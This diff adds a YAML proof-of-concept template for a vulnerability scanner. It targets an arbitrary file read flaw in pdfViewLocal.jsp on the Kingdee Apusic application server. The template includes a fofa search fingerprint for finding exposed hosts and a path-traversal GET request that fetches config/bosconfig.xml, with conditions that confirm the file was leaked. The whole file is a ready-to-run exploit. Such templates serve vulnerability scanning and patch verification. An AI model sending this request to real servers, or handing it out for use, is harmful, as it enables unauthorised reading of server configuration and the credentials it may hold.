@@ -1,0 +1,16 @@
+id: poc-yaml-apusic-pdfviewlocal-fileread
+info:
+  name: 金蝶天燕pdfViewLocal 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 金蝶天燕
+  fofa: header="Apusic Application"
+requests:
+- method: GET
+  path: /easweb/logout/../cp/dm/pdfViewLocal.jsp?path=../config/bosconfig.xml
+  expression: "status_code == 200 && \ncontains(body,\"<?xml version\") &&\ncontains(body,\"\
+    <config>\") &&\ncontains(body,\"<attribute key\") &&\ncontains(headers,\"application/pdf\"\
+    )\n"
+variables: {}
+transport: http
